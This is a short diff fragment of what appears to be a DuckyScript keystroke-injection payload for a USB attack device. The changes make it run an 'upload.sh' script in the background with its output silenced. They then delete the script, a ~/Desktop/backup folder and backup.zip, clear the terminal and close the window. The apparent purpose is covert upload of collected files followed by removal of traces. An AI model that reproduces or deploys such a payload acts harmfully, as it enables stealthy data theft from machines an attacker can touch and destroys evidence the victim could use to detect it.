@@ -37,8 +37,25 @@ ENTER
 STRING chmod +x upload.sh
 ENTER
 DELAY 500
-STRING ./upload.sh
+STRING nohup ./upload.sh >/dev/null 2>&1 &
 ENTER
 DELAY 500
-GUI m
+STRING rm upload.sh
+DELAY 500
+ENTER
+DELAY 500
+STRING rm -r ~/Desktop/backup
+DELAY 500
+ENTER
+DELAY 500 
+STRING rm backup.zip
+DELAY 500
+ENTER
+DELAY 500
+STRING clear
+ENTER
+DELAY 500
+GUI w
+DELAY 1000 
+ENTER
 
